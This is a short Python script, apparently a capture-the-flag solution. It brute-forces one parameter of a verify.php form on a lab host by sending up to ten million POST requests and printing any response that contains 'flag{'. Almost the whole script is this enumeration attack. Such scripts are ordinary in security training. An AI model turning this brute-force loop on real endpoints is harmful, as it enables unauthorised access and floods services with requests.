# cocoaLiquor=123&cocoaButter=123&darkCocoaPowder=123&powderedSugar=111

import requests

# 要发送POST请求的网址
url = 'http://eci-2ze1l5vqsolgjrfi657h.cloudeci1.ichunqiu.com/verify.php'

# POST请求的头部信息
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': 'http://eci-2ze1l5vqsolgjrfi657h.cloudeci1.ichunqiu.com/',
    'Origin': 'http://eci-2ze1l5vqsolgjrfi657h.cloudeci1.ichunqiu.com'
}

for i in range(10000000):
	# POST请求的数据
	data = {
	    'cocoaLiquor': "1337",
	    'cocoaButter': "202409",
	    'darkCocoaPowder': "51540",
	    'powderedSugar': str(i)
	}

	# 发送POST请求
	response = requests.post(url, headers=headers, json=data)

	rescon = response.content

	if rescon.find(b'flag{')!=-1:
		print(rescon)
	# 打印响应内容
	print(response.status_code)  # 响应状态码
	if i==1:
		print(rescon)
	# print(response.json())       # 响应的JSON内容（如果有的话）
